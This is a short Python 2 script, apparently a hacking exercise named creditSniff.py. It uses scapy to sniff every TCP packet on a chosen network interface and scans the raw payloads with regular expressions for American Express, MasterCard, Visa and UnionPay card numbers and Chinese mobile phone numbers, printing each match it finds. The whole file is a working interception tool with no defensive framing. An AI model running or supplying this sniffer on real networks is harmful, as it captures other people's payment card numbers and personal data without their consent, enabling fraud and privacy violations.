# -*- coding: UTF-8 -*-

'''
Created on 2018年9月17日

@author: monking
'''

import re,optparse
from scapy.all import *

def findBankCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    
    # American Express信用卡由34或37开头的15位数字组成
    americaRE = re.findall('3[47][0-9]{13}', raw)
    # MasterCard信用卡的开头为51~55，共16位数字
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    # Visa信用卡开头数字为4，长度为13或16位
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
    # UnionPay卡开头数字为62，长度为18位数字
    unionPayRE = re.findall('62[0-9]{14,17}', raw)
    #phone 开头数字为13，长度为11位
    phoneRE = re.findall('13[0-9]{9}', raw)
    
    if americaRE:
        print '[+] Found American Express Card: ' + americaRE[0]
    if masterRE:
        print '[+] Found MasterCard Card: ' + masterRE[0]
    if visaRE:
        print '[+] Found Visa Card: ' + visaRE[0]
    if unionPayRE:
        print '[+] Found UnionPay Card：' + unionPayRE[0]
    if phoneRE:
        print '[+] Found Phone Number：' + phoneRE[0]        
    

def main():
    parser = optparse.OptionParser('[*]Usage: python creditSniff.py -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Bank Card Sniffer.'
        sniff(filter='tcp', prn=findBankCard, store=0)
    except KeyboardInterrupt:
        exit(0)

    


if __name__ == '__main__':
    main()